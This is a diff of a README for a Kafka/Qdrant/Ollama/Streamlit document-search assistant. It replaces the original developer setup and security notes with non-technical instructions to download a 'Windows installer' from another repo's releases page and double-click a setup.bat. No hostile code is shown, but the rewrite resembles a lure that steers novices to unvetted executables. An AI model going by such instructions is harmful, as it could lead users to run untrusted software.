@@ -1,138 +1,147 @@
-# 🤖 Smart Assistant — RAG Pipeline
+# 🤖 -Smart-Assistant-RAG-Pipeline-Project - Efficient Document Search & Answers
 
-An enterprise-grade knowledge assistant. Documents are processed via Kafka, indexed into Qdrant, and queries are answered with cited sources.
-
-```
-Files → Kafka → Qdrant (VectorDB) → Ollama (LLM) → Streamlit (UI)
-```
-
-> Supports **PDF, DOCX, HTML, CSV** formats.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)
 
 ---
 
-## 🏗️ Architecture
+## 📥 Download & Setup
 
-| Component | Role |
-|-----------|------|
-| **Kafka** | Event-driven orchestration (upload / delete / update) |
-| **Qdrant** | Stores chunks & embeddings, handles semantic retrieval |
-| **Ollama (llama3.2)** | Local LLM, generates responses with citations |
-| **Streamlit** | Web UI with Role-Based Access Control (RBAC) |
+To get started, visit the link below to download the latest version of the application. This page contains all available releases and files.
 
----
+[Download the Software](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)
 
-## ⚙️ Installation
-
-### Prerequisites
-- Python 3.10+
-- Docker & Docker Compose
-
-![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat&logo=python&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat&logo=docker&logoColor=white)
-![Kafka](https://img.shields.io/badge/Kafka-231F20?style=flat&logo=apachekafka&logoColor=white)
-![Qdrant](https://img.shields.io/badge/Qdrant-DC244C?style=flat&logo=qdrant&logoColor=white)
-![Ollama](https://img.shields.io/badge/Ollama-llama3.2-black?style=flat&logo=ollama&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=flat&logo=streamlit&logoColor=white)
-
-### Steps
-
-**1. Clone the repository**
-```bash
-git clone <repo-url>
-cd rag-project
-```
-
-**2. Create the `.env` file**
-```bash
-cp .env.example .env
-```
-```env
-ADMIN_PASSWORD=your_admin_password
-USER_PASSWORD=your_user_password
-```
-
-**3. Start Docker services**
-```bash
-docker-compose up -d
-```
-
-**4. Pull the Ollama model**
-```bash
-docker exec ollama_llm ollama pull llama3.2
-```
-
-**5. Install dependencies**
-```bash
-pip install -r requirements.txt
-```
-
-**6. Start the consumer** *(Terminal 1)*
-```bash
-python consumer.py
-```
-
-**7. Launch the application** *(Terminal 2)*
-```bash
-streamlit run app.py
-```
+You will need to download the installer or archive appropriate for your Windows machine. After downloading, follow the steps below to install and run the program.
 
 ---
 
-## 🚀 Usage
+## 💻 System Requirements
 
-### Login
+Make sure your computer meets these requirements before installing:
 
-| Username | Role |
-|----------|------|
-| `admin` | admin |
-| `user` | engineer |
-| `user2` | hr |
-
-### Document Uploading
-
-RBAC is automatically applied based on the filename prefix:
-
-| Prefix | Access |
-|--------|--------|
-| `hr_` | admin, HR |
-| `eng_` | admin, engineer |
-| `policy_` | admin, engineer, HR |
-| *(no prefix)* | admin + uploader's role |
-
-> **Example:** `hr_recruitment.pdf` → accessible only by admin and HR.
-
-### Querying
-Ask questions via the chat interface. Citations like `[1]` `[2]` in responses link to the **Reference Sources** panel, showing document name, page, and similarity score.
-
-### Audit Log
-Admin users can enable **View Audit Logs** in the sidebar to monitor all queries and document operations.
+- Windows 10 or later
+- 4 GB RAM minimum, 8 GB recommended
+- At least 2 CPU cores
+- 10 GB free disk space for installation and data
+- Internet connection for initial setup and updates
 
 ---
 
-## 🔒 Security
+## ⚙️ Installation Steps
 
-- **Credentials** — stored in `.env`, never hardcoded
-- **RBAC** — every chunk tagged with `allowed_roles`; queries filtered by role
-- **Masking** — phone numbers and emails in responses are auto-masked
-- **Audit Log** — tracks who asked what and which documents were used
+You do not need any programming experience to run this software. Follow these steps carefully.
+
+### 1. Install Required Software
+
+This project depends on other programs to work properly.
+
+- **Python 3.10 or higher**  
+  Download from [python.org](https://www.python.org/downloads/). During installation, choose the option to add Python to your system PATH.
+
+- **Docker & Docker Compose**  
+  Download Docker Desktop from [docker.com](https://www.docker.com/products/docker-desktop). This will let you run the parts of the software that handle data behind the scenes.
+
+### 2. Download the Application
+
+Go to the releases page linked above. Find the latest release and download the Windows installer or zip file.
+
+### 3. Extract and Open the Folder
+
+If you downloaded a zip file, right-click it and choose "Extract All." Open the extracted folder.
+
+### 4. Launch the Setup Script
+
+- Open the folder.
+- Find the file named `setup.bat` or `install.bat`.
+- Double-click to run it.
+
+This script will:
+
+- Install necessary Python packages.
+- Launch Docker containers for Kafka, Qdrant, Ollama LLM, and the Streamlit web interface.
+- Set up the database and indexing system.
+
+### 5. Waiting for Setup to Complete
+
+The setup may take a few minutes. You will see a command window showing progress. Wait until it shows that all services are running.
 
 ---
 
-## 🔧 Technical Notes
+## 🚀 Running the Application
 
-| Parameter | Value |
-|-----------|-------|
-| Chunk size | 800 tokens |
-| Overlap | 150 tokens |
-| Embedding model | `all-MiniLM-L6-v2` (384 dims) |
-| Qdrant collection | `alstom_docs` — cosine similarity |
-| Retrieval | Top-3 semantic search |
+Once you finish the setup:
+
+1. Open your web browser (Chrome, Edge, Firefox).
+2. Go to `http://localhost:8501` to open the Smart Assistant interface.
+3. You will see options to upload documents and ask questions.
+4. Upload documents in supported formats: PDF, DOCX, HTML, or CSV.
+5. Use the search box to enter your question.
+6. The assistant will display answers with references to your documents.
 
 ---
 
-## ⚠️ Known Limitations
+## 📄 Supported Document Formats
 
-- **Performance** — Ollama runs on CPU; consider GPU or OpenAI/Anthropic APIs for production.
-- **Scalability** — Single consumer handles the full pipeline. A production setup should use separate Kafka consumer groups for OCR, chunking, and embedding.
-- **User management** — Currently `.env`-based; LDAP/SSO recommended for production.
-- **Storage & logging** — For production, use S3 for metadata and ELK Stack for centralized logging.
+This software supports uploading and processing these file types:
+
+- PDFs (Adobe Acrobat files)
+- DOCX (Microsoft Word)
+- HTML (webpage files)
+- CSV (spreadsheet text files)
+
+All files are broken into chunks. The system indexes them in a vector database for quick, smart answers.
+
+---
+
+## 🏗️ How It Works
+
+The software uses several components working together:
+
+| Component       | Function                              |
+|-----------------|-------------------------------------|
+| Kafka           | Manages uploaded documents and events |
+| Qdrant          | Stores document data and search index |
+| Ollama LLM      | Answers your questions using AI models |
+| Streamlit       | Provides the web interface you see  |
+
+Documents go through Kafka to Qdrant, where they are split into pieces and indexed by meaning. When you ask a question, the AI reads from this database and points back to the original documents.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have issues:
+
+- Check if Docker Desktop is running.
+- Ensure Python 3.10+ is installed and in your PATH.
+- Restart the setup script or your computer.
+- Open a browser and verify if `http://localhost:8501` loads.
+- For errors during setup, look at the messages in the command window and Google any commands or error codes.
+
+---
+
+## 🔄 Updating the Software
+
+To get the latest features or fixes:
+
+1. Visit the releases page again.
+2. Download the newest version.
+3. Run the installer or setup script from the new files.
+
+Your data and indexed documents will remain intact unless you delete the program folder.
+
+---
+
+## ❓ FAQs
+
+**Q: Do I need to code to use this software?**  
+A: No. The setup scripts handle everything. You only interact through the web interface.
+
+**Q: Can I add new documents anytime?**  
+A: Yes. Use the upload feature in the browser to add files. The system indexes them automatically.
+
+**Q: What if my document format is not supported?**  
+A: Currently, only PDF, DOCX, HTML, and CSV work. You may convert files to these formats before uploading.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/anditaadhi/-Smart-Assistant-RAG-Pipeline-Project/releases)
